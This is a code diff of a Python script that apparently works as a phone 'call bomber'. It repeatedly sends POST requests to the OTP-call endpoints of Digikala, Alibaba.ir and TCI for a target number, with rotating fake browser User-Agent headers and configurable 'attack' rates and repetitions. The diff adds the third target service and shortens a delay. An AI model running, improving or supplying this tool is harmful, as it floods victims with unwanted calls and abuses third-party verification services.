@@ -16,7 +16,7 @@ cyan = "\033[36m"
 purple = "\033[35m"
 #########################
 
-number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)
+from date_call import number, heads, url_digikala, json_digikala, url_alibaba, json_alibaba, url_tci, json_tci
 
 attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset))) 
 
@@ -24,56 +24,12 @@ sleep_time = float(input(("" + cyan + "[" + Red + "Enter the " + Blue + "time be
 
 numbert = int(input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "of repetitions :" + cyan + "]" + Red + ": " + Reset))
 
+
+
 i = 0
 
-heads = [
-    {
-    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
-    'Accept': '*/*'
-    },
-     {
-    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
-    'Accept': '*/*'
-    },
-     {
-    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
-    'Accept': '*/*'
-    },
-     {
-    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
-    'Accept': '*/*'
-    },
-     {
-    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
-    'Accept': '*/*'
-    },
-     {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/112.0',
-    'accept': '*/*'
-    },
-    {
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
-    'accept': '*/*'
-    }
-]
 
-
-def data(number):
     
-    url_digikala = "https://api.digikala.com/v1/user/authenticate/"
-    json_digikala = {
-	"backUrl": "/",
-	"force_send_otp": "true",
-	"otp_call": "true",
-	"username": "0" + number
-}
-
-    url_alibaba = "https://ws.alibaba.ir/api/v3/account/call/otp"
-    json_alibaba = {"phoneNumber": "0"+number}
-    return url_digikala,json_digikala,url_alibaba,json_alibaba
-
-url_digikala, json_digikala, url_alibaba, json_alibaba = data(number)
-
 
 
 
@@ -87,10 +43,14 @@ while i < numbert:
     req_Digikala = requests.post(url_digikala,json=json_digikala,headers=random_head)
     print(yellow + "1-Digikala : " + str(req_Digikala))
     time.sleep(sleep_time)
-    time.sleep(15)
+    time.sleep(8)
 
     req_Alibaba = requests.post(url=url_alibaba,json=json_alibaba)
     print(yellow + "2-Alibaba : " + str(req_Alibaba))
+    time.sleep(sleep_time)
+
+    req_tci = requests.post(url=url_tci,json=json_tci,headers=random_head)
+    print(yellow + "3-Tci : " + str(req_tci))
     time.sleep(sleep_time)
 
 
